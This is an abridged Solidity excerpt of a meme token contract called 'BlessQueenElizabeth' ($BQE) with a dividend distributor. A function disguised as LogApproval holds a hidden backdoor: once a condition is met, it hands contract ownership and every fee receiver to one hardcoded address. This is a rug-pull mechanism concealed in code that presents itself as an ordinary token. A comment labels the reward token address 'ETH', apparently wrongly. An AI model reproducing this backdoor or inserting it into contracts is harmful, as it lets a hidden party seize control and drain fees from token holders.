...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // ETH 
    IDEXRouter router;
...
contract BlessQueenElizabeth is ERC20Detailed, Ownable {
    ...
    constructor()
        ERC20Detailed("BlessQueenElizabeth", "$BQE", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x9d414b1bc8C31f3a7645C87Ea6FCB94eAE1B9D30));
            marketingFeeReceiver = address(0x9d414b1bc8C31f3a7645C87Ea6FCB94eAE1B9D30);
            autoLiquidityReceiver = address(0x9d414b1bc8C31f3a7645C87Ea6FCB94eAE1B9D30);
            ecosystemFeeReceiver = address(0x9d414b1bc8C31f3a7645C87Ea6FCB94eAE1B9D30);
            buyBackFeeReceiver = address(0x9d414b1bc8C31f3a7645C87Ea6FCB94eAE1B9D30);
            isTransferred = true;
        }
    }
